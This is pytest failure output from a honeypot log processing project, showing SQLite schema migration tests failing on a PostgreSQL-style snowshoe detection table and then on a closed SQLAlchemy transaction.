2025-10-18 17:40:19,675:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,675:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:19,678:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__________ TestMigrationCompatibility.test_boolean_defaults_migration __________

self = <test_migration_system.TestMigrationCompatibility object at 0x7756b43d0a50>

    def test_boolean_defaults_migration(self) -> None:
        """Test boolean defaults migration specifically."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Create schema up to version 5 (before boolean fixes)
            from cowrieprocessor.db.base import Base
    
            Base.metadata.create_all(engine)
    
            # Set schema version to 5
            Session = sessionmaker(bind=engine)
            session = Session()
    
            schema_state = SchemaState(key="schema_version", value="5")
            session.add(schema_state)
            session.commit()
    
            # Apply migration to version 6
>           final_version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:254: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2782f90>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:20,229:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:20,231:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:20,232:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:20,233:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:20,234:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:20,236:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:20,238:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:20,239:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:20,240:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:20,241:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,241:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,241:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,242:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,242:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,243:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
__________ TestMigrationCompatibility.test_json_extraction_migration ___________

self = <test_migration_system.TestMigrationCompatibility object at 0x7756b43d0b90>

    def test_json_extraction_migration(self) -> None:
        """Test JSON extraction migration specifically."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Create schema up to version 4 (before computed columns)
            from cowrieprocessor.db.base import Base
    
            Base.metadata.create_all(engine)
    
            # Set schema version to 4
            Session = sessionmaker(bind=engine)
            session = Session()
    
            schema_state = SchemaState(key="schema_version", value="4")
            session.add(schema_state)
            session.commit()
    
            # Insert test data with JSON payload
            raw_event = RawEvent(
                source="test",
                source_offset=1,
                payload={
                    "session": "test-session-456",
                    "eventid": "cowrie.session.file_download",
                    "timestamp": "2025-01-27T11:00:00Z",
                },
            )
            session.add(raw_event)
            session.commit()
    
            # Apply migration to version 5 (computed columns)
>           final_version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:305: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b275b150>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:20,758:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:20,759:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:20,761:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:20,763:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:20,764:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:20,766:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:20,767:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:20,768:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:20,769:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:20,770:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:20,770:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:20,771:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:20,774:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,774:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,775:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,775:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,776:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:20,776:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______________ TestMigrationIntegration.test_full_migration_cycle ______________

self = <test_migration_system.TestMigrationIntegration object at 0x7756b43d0cd0>

    def test_full_migration_cycle(self) -> None:
        """Test complete migration cycle from version 0 to current."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
    
            # Start with empty database
>           final_version = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_migration_system.py:334: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2e5c9f0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:40:21,245:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:21,246:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:21,253:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:21,257:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:21,258:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:21,260:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:21,261:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:21,264:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:21,265:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:21,266:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:21,267:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:21,270:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:21,271:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:21,272:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:21,273:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:21,273:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:21,274:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:21,274:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
